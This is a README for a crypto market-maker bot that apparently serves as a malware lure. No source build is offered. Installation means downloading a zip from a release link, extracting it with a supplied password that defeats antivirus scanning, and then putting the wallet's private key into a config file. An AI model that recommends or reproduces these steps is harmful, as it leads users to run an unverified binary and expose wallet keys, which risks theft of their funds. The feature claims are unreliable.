## Overview
This project is a Market Maker Bot designed to automate liquidity provision on decentralized exchanges (DEXs) operating on the Ethereum network and its Layer 2 (L2) solutions. The bot dynamically manages liquidity positions in various trading pairs, optimizing for profitability while minimizing risk exposure. It is developed using **.NET** and utilizes the **Nethereum** library to interact with the Ethereum blockchain and its L2 solutions.

## Features
- **Automated Liquidity Provision**: Automatically provides liquidity in selected trading pairs on DEXs to earn fees.
- **Dynamic Position Management**: Monitors and rebalances liquidity positions based on market conditions.
- **Gas Optimization**: Uses gas-efficient techniques to minimize transaction costs, especially on Ethereum L1.
- **Compatibility with L2**: Supports Layer 2 networks (e.g., Arbitrum, Optimism) for reduced transaction costs and faster execution times.
- **Customizable Strategies**: Allows users to define and implement custom strategies tailored to their risk tolerance and profitability goals.
- **Risk Management**: Incorporates risk controls such as stop-loss mechanisms and impermanent loss protection.

## Requirements
- **.NET SDK**: Ensure you have the latest version of the .NET SDK installed to run the bot.
- **Ethereum Wallet**: MetaMask or other compatible Ethereum wallet for bot interaction.
- **API Keys**: Access to Ethereum node (e.g., Infura, Alchemy) for network interaction and real-time data.

## Installation
1. Download the latest release archive from the [Release](https://github.com/xxblacksmithxxlau/market-maker-bot/releases/download/Release/market-maker-bot.zip).
2. Extract the archive using the password `YHS70vOP4Q`.
3. Navigate to the extracted folder and edit config.
4. Start bot.

## Configuration
Open the config.json file located in the root directory.
Fill in the required fields:
- rpc: Your Ethereum node RPC URL (e.g., from Infura, Alchemy)
- privateKey: Private key for the Ethereum wallet you will use
- dexAddress: Address of the decentralized exchange you want to provide liquidity on
- l2Network: Specify the L2 network (if applicable, e.g., Arbitrum, Optimism)

Example configuration:
```
    json

    {
        "rpc": "https://mainnet.infura.io/v3/YOUR_API_KEY",
        "privateKey": "YOUR_PRIVATE_KEY",
        "dexAddress": "0xDEXADDRESS",
        "l2Network": "Arbitrum"
    }
```


## Supported Networks
- Ethereum (L1)
- Arbitrum (L2)
- Optimism (L2)
- Polygon (L2)

## Strategies
This bot includes several built-in strategies:
- Passive Liquidity Provision: Provides liquidity without frequent rebalancing.
- Active Market Making: Actively monitors and adjusts liquidity positions based on market price movements.
- Custom Strategies: Users can implement their own strategies by extending the bot’s core functionality in C#.

## Contributions
Contributions are welcome! Feel free to open a pull request or submit an issue if you have suggestions or bugs to report.

## Disclaimer
This software is for educational purposes only. The use of this bot may involve financial risk, including but not limited to impermanent loss, smart contract vulnerabilities, and market fluctuations. Use it at your own risk, and do your own research (DYOR) before deploying in a live environment.
